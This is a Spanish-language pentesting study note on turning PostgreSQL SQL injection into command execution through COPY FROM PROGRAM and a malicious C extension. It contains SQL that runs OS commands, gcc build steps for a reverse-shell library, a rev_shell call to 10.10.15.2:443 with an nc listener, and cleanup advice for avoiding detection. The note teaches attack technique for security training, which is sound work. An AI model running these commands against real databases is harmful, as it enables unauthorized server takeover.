---
tags:
  - Web/Red-Team
  - SQLi
  - Pentesting/Explotacion
Fecha de actualización: 2026-06-04
Nota previa: "[[08 - PostgreSQL lectura y escritura de archivos]]"
Nota siguiente: "[[10 - Prevención de SQL Injection]]"
Area: "[[SQL Injection.base|SQL Injection]]"
---
---

La escalada máxima en PostgreSQL: convertir la SQLi en ejecución de comandos del sistema —el equivalente a [[10 - MSSQL ejecución de comandos con xp_cmdshell|`xp_cmdshell` en MSSQL]] o la [[08 - Escritura de archivos|web shell en MySQL]]—. Dos métodos: `COPY FROM PROGRAM` (directo) y extensiones C (para cuando el primero está restringido). Ambos requieren privilegios elevados y corren como el usuario `postgres`.

# Método 1: `COPY ... FROM PROGRAM`

Además de leer/escribir ficheros, `COPY` puede **almacenar la salida de un programa** en una tabla. Esto es RCE directo:

```sql
CREATE TABLE tmp(t TEXT);
COPY tmp FROM PROGRAM 'id';
SELECT * FROM tmp;       -- uid=119(postgres) gid=124(postgres) ...
DROP TABLE tmp;
```

> [!info]+
> A esta funcionalidad se le asignó <mark style="background: #FFB8EBA6;">`CVE-2019-9193`, pero el equipo de PostgreSQL la declaró *funcionalidad intencionada*, no una vulnerabilidad</mark>: `COPY FROM PROGRAM` solo es usable por superusuarios o el rol `pg_execute_server_program`. El "fallo" real es conceder esos privilegios a la cuenta de la aplicación. Es el método más rápido cuando está disponible.

# Método 2: Extensiones C (UDF)

Cuando `COPY FROM PROGRAM` está bloqueado pero podemos crear funciones, se carga una **extensión C maliciosa**. El flujo:

1. **Escribir y compilar** una extensión C que abra una reverse shell (`pg_rev_shell.so`). <mark style="background: #FF5582A6;">Debe compilarse para la versión *major* exacta del PostgreSQL objetivo</mark> (el `PG_MODULE_MAGIC` lo verifica) —aquí 13—:
   ```shell-session
   $ sudo apt install postgresql-server-dev-13
   $ gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_rev_shell.so pg_rev_shell.c
   ```
2. **Subir** el `.so` al servidor con [[08 - PostgreSQL lectura y escritura de archivos|`COPY` o large objects]].
3. **Cargar y ejecutar** la función:
   ```sql
   CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS '/tmp/pg_rev_shell', 'rev_shell' LANGUAGE C STRICT;
   SELECT rev_shell('10.10.15.2', 443);
   ```
4. **Limpiar**: `DROP FUNCTION rev_shell;` y `lo_unlink(...)`.

La consulta de la reverse shell "cuelga" (el servidor espera a que termine la función), y en el listener (`nc -nvlp 443`) llega una shell como `postgres`.

> [!important]+
> **Permisos**: <mark style="background: #FF5582A6;">cargar extensiones en C requiere **siempre ser superusuario**</mark>. El lenguaje `C` es intrínsecamente *untrusted* (accede a memoria directamente) y PostgreSQL no permite marcarlo como *trusted*, así que `CREATE FUNCTION ... LANGUAGE C` está reservado al superusuario —no hay atajo vía `CREATE` en `public`—. Por eso, en la práctica, `COPY FROM PROGRAM` (rol `pg_execute_server_program`) suele ser una vía más accesible que las extensiones C.

> [!info]+
> **Automatización**: subir la `.so` por large objects son muchas peticiones (una por página de 2 kB) más la carga y el trigger. <mark style="background: #8000E1A6;">Este es el caso típico para escribir un script</mark> (Python con `requests`): una función `sqli(q)` que inyecta la query, un bucle que sube el binario en chunks hex, y las llamadas finales `lo_export`/`CREATE FUNCTION`/`rev_shell`. Hacerlo a mano es inviable.

> [!warning]+
> **OPSEC y realidad 2026**: el RCE vía PostgreSQL exige superusuario o privilegios de fichero/programa —cada vez menos frecuentes en despliegues endurecidos—. Cuando se da (cuenta de app sobreprivilegiada, un clásico), limpia siempre: `DROP FUNCTION`, `lo_unlink`, borra la `.so` y las tablas temporales. Una reverse shell desde `postgres` y un `gcc`/`.so` recién escrito son señales que cualquier EDR detecta.

> [!info]+
> **RCE por SQLi según motor**: PostgreSQL (`COPY FROM PROGRAM`, extensiones C), [[10 - MSSQL ejecución de comandos con xp_cmdshell|MSSQL]] (`xp_cmdshell`, OLE Automation, CLR), MySQL ([[08 - Escritura de archivos|web shell vía `INTO OUTFILE`]], UDF `lib_mysqludf_sys`). El patrón es siempre el mismo: abusar de una función del motor que toca el SO, condicionado a privilegios. El objetivo final —ejecución de comandos en el servidor— coincide con el de una [[00 - Introducción a Command Injection|command injection]] directa, alcanzado por otra vía.

Tras ver todo lo que una SQLi avanzada permite, el cierre del path es cómo prevenirla: [[10 - Prevención de SQL Injection]].
